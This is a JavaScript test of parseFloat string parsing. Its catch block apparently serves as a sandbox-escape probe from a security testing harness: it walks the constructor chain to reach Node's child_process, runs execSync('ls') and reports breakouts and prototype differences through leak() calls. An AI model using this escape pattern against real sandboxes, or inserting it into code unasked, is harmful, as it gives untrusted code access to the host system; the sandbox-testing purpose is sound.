try {
    if (parseFloat('-11.string') !== -11) {
        $ERROR('#1: parseFloat("-11.string") === -11. Actual: ' + parseFloat('-11.string'));
    }
    if (parseFloat('01.string') !== 1) {
        $ERROR('#2: parseFloat("01.string") === 1. Actual: ' + parseFloat('01.string'));
    }
    if (parseFloat('+11.1string') !== 11.1) {
        $ERROR('#3: parseFloat("+11.1string") === 11.1. Actual: ' + parseFloat('+11.1string'));
    }
    if (parseFloat('01.1string') !== 1.1) {
        $ERROR('#4: parseFloat("01.1string") === 1.1. Actual: ' + parseFloat('01.1string'));
    }
    if (parseFloat('-11.e-1string') !== -1.1) {
        $ERROR('#5: parseFloat("-11.e-1string") === -1.1. Actual: ' + parseFloat('-11.e-1string'));
    }
    if (parseFloat('01.e1string') !== 10) {
        $ERROR('#6: parseFloat("01.e1string") === 10. Actual: ' + parseFloat('01.e1string'));
    }
    if (parseFloat('+11.22e-1string') !== 1.122) {
        $ERROR('#7: parseFloat("+11.22e-1string") === 1.122. Actual: ' + parseFloat('+11.22e-1string'));
    }
    if (parseFloat('01.01e1string') !== 10.1) {
        $ERROR('#8: parseFloat("01.01e1string") === 10.1. Actual: ' + parseFloat('01.01e1string'));
    }
    if (parseFloat('001.string') !== 1) {
        $ERROR('#9: parseFloat("001.string") === 1. Actual: ' + parseFloat('001.string'));
    }
    if (parseFloat('010.string') !== 10) {
        $ERROR('#10: parseFloat("010.string") === 10. Actual: ' + parseFloat('010.string'));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}